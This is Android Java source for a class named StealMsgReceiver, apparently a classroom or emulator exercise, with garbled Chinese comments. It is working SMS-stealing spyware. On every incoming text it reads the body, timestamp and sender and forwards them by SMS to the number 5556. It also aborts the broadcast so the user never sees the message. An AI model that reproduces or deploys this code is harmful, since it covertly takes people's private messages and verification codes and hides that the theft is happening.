package com.sxt.msg;

import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
/**
 * ���ŵ���ȡ �����͵�ָ���ֻ���
 *
 */
public class StealMsgReceiver extends BroadcastReceiver{

	@Override
	public void onReceive(Context arg0, Intent intent) {
		System.out.println("------------onReceive---------");
		//��ȡ����Ϣ����
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for(Object p : pdus){
			byte[] pdu = (byte[]) p;
			SmsMessage message = SmsMessage.createFromPdu(pdu);
			String content = message.getMessageBody();
			Date date = new Date(message.getTimestampMillis());
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String receiveTime = format.format(date);
			String senderNumber = message.getOriginatingAddress();
			
			//���Ͷ���
			sendSMS(content, receiveTime, senderNumber);
			
			//�����5556�����Ķ��� ���ε�
//			if("5556".equals(senderNumber)){
				abortBroadcast();//��ֹ�㲥
//			}
		}
	}
	
	/**
	 * ���Ͷ���
	 */
	private boolean sendSMS(String content, String receiveTime, String senderNumber) {
		try{
			String params = "content="+ URLEncoder.encode(content, "UTF-8")+
				"&receivetime="+ receiveTime+ "&sendernumber="+ senderNumber;
			System.out.println("=============="+params);

			//�Զ������صĶ���ת����5556
			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("5556", null, params, null, null);
		}catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}
}
